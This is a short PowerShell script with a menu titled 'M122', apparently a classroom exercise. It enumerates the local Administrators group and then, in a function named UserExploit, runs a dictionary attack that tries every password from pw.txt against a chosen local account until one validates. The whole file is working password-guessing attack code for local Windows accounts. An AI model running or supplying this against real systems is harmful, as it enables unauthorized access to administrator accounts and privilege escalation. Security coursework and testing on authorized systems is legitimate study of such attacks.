function ShowMenu {
    param (
        [string]$Title = 'M122'
    )
    Clear-Host
    Write-Host "================ $Title ================"
    
    Write-Host "Enter '1' to search for Administrators."
    Write-Host "Enter '2' to validate Administrator with Passwords."
    Write-Host "Enter 'Q' to quit."
}

function AdminCheck {
  $members = net localgroup administrators
  $members[6..($members.Length-3)]
}

function UserExploit {
  param($user, $passwordFile)
  Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
  $accountManager = [DirectoryServices.AccountManagement.PrincipalContext]::new([DirectoryServices.AccountManagement.ContextType]::Machine)
  foreach($password in (gc $passwordFile)) {
    Write-Host "Trying Password " -nonewline
    Write-Host $password -f yellow
    if ($accountManager.ValidateCredentials($user, $password)) {
      Write-Host "Matched successfully" -f green
      return
    } else {
      Write-Host "No match" -f red
    }
  }
}

do
 {
    ShowMenu
    $selection = Read-Host "Please make a selection"
    
    switch ($selection)
    {
      '1' {
        AdminCheck 
      } 
      '2' {
        $username = Read-Host "Enter a Username"
        UserExploit $username .\pw.txt
      }
      'Q' {
        Write-Host "You are trying to quit the script..." -f yellow
      }
    }
    pause
 }
 until ($selection -eq 'Q')